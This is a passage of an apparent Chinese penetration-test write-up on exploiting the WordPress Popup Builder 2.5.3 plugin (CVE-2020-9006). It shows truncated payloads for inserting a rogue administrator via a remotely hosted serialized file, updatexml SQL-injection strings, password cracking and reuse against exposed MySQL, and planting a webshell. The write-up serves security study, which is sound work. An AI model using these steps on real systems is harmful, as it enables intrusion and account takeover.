个函数，访问的URL是什么。
通 过 查 看 \wp-content\plugins\popup-builder\files\sg_popup_ajax.php ⽂
件中151⾏，也就是该函数完毕后的那⼀⾏。
WordPress的设计中add_action函数是⽤于添加动作的，回调函数就是我们刚刚分析
的 那 个 函 数 sgImportPopups(), ⽽ wp_ajax_import_popups 是 所 挂 载 的 动 作
（action）的名称，⽽add_action的定义是在wp-includes/plugin.php ⽂件中，
其实还是调⽤了⼀次add_filter函数。
所 以 根 据 WordPress 的 规 则 ， 本 插 件 该 函 数 应 该 请 求 的 URL 的 地 址 为 ：
http://www.xxx.com/wp-admin/admin-ajax.php
4 漏洞利⽤之新增管理员
通过以上分析，我们可以实现通过URL请求直接向数据库中的任意表中新增数据，所以
这个漏洞利⽤危害⽐较⼤的应该就是增加超级管理员账号，也就是往wp_users表中新
增数据（虽然我们现在已经进⼊后台了，这⾥只是为了验证该漏洞是否存在以及对我们
代码审计出的结果进⾏验证）。
https://mp.weixin.qq.com/s/O7bDgQrc2M5Fc60dRtVM6g 9/20
2020/7/27 渗透测试之⿊⽩⽆常
根据代码显示通过读取url⾥的内容，可以⾃定义数据内容，并且内容没有进⾏任何的处
理及过滤就直接进⼊数据库进⾏INSERT。
构造新增管理员的payload，新增⼀个登录名叫aaaa密码为admin的超级管理员。
https://mp.weixin.qq.com/s/O7bDgQrc2M5Fc60dRtVM6g 10/20
2020/7/27 渗透测试之⿊⽩⽆常
执⾏该脚本得到的payload为：
1 YToyOntzOjEwOiJjdXN0b21EYXRhIjthOjE6e3M6NToidXNlcnMiO2E6MTp7aTowO2E6Nzp7a
https://mp.weixin.qq.com/s/O7bDgQrc2M5Fc60dRtVM6g 11/20
2020/7/27 渗透测试之⿊⽩⽆常
将该字符串保存为txt⽂件（别的⽂件也可以）存放另⼀台服务器上，拼装参数进⾏访
问：
1 action=import_popups&attachmentUrl=http://192.168.27.1/wordpress-5.2.3/3.
action参数上⾯已经说到是⼀个hook，attachmentUrl参数就是该插件需要访问的url
地址，执⾏结果如下：
查看数据库，user表中已经新增另⼀个⽤户aaaa了。
5 漏洞利⽤之SQL注⼊
既然能够成功执⾏SQL语句，并且能新增管理员或者往其他数据表中插⼊数据，那么理
论上这个地⽅也是存在SQL注⼊的，这⾥使⽤报错注⼊来尝试是否存在SQL注⼊，⽣成
的payload的脚本如下：
https://mp.weixin.qq.com/s/O7bDgQrc2M5Fc60dRtVM6g 12/20
2020/7/27 渗透测试之⿊⽩⽆常
⽣成后的内容为：
1 YToyOntzOjEwOiJjdXN0b21EYXRhIjthOjE6e3M6NToidXNlcnMiO2E6MTp7aTowO2E6Nzp7a
请求访问：
https://mp.weixin.qq.com/s/O7bDgQrc2M5Fc60dRtVM6g 13/20
2020/7/27 渗透测试之⿊⽩⽆常
该payload代⼊之后在数据库⾥执⾏的SQL语句为：
1 INSERT INTO wp_users(user_login, user_pass, user_nicename, user_email, us
可以看出这⾥存在SQL注⼊，根据以上⽅法，继续爆库：
爆表，这⾥如果直接使⽤以下语句，那么会报错，提示输出不⽌⼀个结果。
1 aaaa' or updatexml(1,concat(0x7e,(select table_name from information_sche
https://mp.weixin.qq.com/s/O7bDgQrc2M5Fc60dRtVM6g 14/20
2020/7/27 渗透测试之⿊⽩⽆常
所以，爆表的payload需要加limit来控制返回结果，通过控制Limit参数爆出所有的数
据表。
1 aaa' or updatexml(1,concat(0x7e,(select table_name from information_schem
根据此⽅法，依次注⼊出wp_users表内容发现存在两个⽤户，其中⼀个是admin还有
⼀个lixin的账户。
查询该账户的密码，密⽂为：$P$BjHS8QLdmCaTNiiQnvfuE730meyngJ0，解密
后得到lixin的账户密码为：lixin@123。
https://mp.weixin.qq.com/s/O7bDgQrc2M5Fc60dRtVM6g 15/20
2020/7/27 渗透测试之⿊⽩⽆常
6 拿到WebShell
因为已经进⼊后台了，所以其实这⾥注⼊出数据并没有什么作⽤，尝试过使⽤SQL写
Shell但是并未成功，注⼊出来实在属于暂时没找到其他突破⼝，闲的⽆聊的情况下就将
数据注⼊出来了，却没成想这却成为了后续测试的突破⼝。通过端⼝扫描发现⽬标服务
器开放3306端⼝，也就是Mysql是对外开放的。最终使⽤账户root密码lixin@123成
功登陆mysql数据库。
https://mp.weixin.qq.com/s/O7bDgQrc2M5Fc60dRtVM6g 16/20
2020/7/27 渗透测试之⿊⽩⽆常
虽然已经拿到了Mysql的root权限，但是肯定不能就这么结束啊，继续寻找可以利⽤的
点，使⽤Mysql的命令执⾏功能查看Mysql的安装路径，使⽤@@datadir函数查看。
https://mp.weixin.qq.com/s/O7bDgQrc2M5Fc60dRtVM6g 17/20
2020/7/27 渗透测试之⿊⽩⽆常
由于本⽂章是在本地复现的，所以环境会有⼀定的差异，当时在做测试的时候，查看到
的mysql路径是/root/lnmp/mysql下的⽬录，根据⽬录结构以及常规命名和使⽤习惯
来说，最后通过测试，猜测到⽹站绝对路径为/root/lnmp/www⽬录，到此为⽌获得
的东⻄为root权限的Mysql账户，⽹站绝对路径，尝试使⽤Mysql进⾏写shell。
使⽤查询写⻢的⽅式成功写⼊⼀句话⽊⻢，使⽤蚁剑或菜⼑连接。
成功拿到WebShell。
https://mp.weixin.qq.com/s/O7bDgQrc2M5Fc60dRtVM6g 18/20
2020/7/27 渗透测试之⿊⽩⽆常
本次测试到这⾥就结束了，由于授权的原因并没有进⾏后续的提权或者内⽹等操作。
7 结语
本⽂其实只是针对WoedPress的Popup Builder插件2.5.3版本，通过代码审计发现
并利⽤了该插件的SQL注⼊漏洞，但是漏洞点其实还有⼀个反序列化，⾄于是否存在反
序列化漏洞，当初在做测试的时候由于时间关系并没有去分析，所以这⾥暂不讨论。
后 续 通 过 在 搜 索 引 擎 上 检 索 居 然 发 现 该 漏 洞 还 存 在 ⼀ 个 CVE 编 号 （ CVE-2020-
9006），这⾥如果早点发现该CVE编号，那么在代码审计的时候可以少⾛好多弯路，
节省⼤量时间，所以在以后的项⽬中⼀定要注意信息收集，尽量全⾯、仔细。
https://mp.weixin.qq.com/s/O7bDgQrc2M5Fc60dRtVM6g 19/20
2020/7/27 渗透测试之⿊⽩⽆常
https://mp.weixin.qq.com/s/O7bDgQrc2M5Fc60dRtVM6g 20/20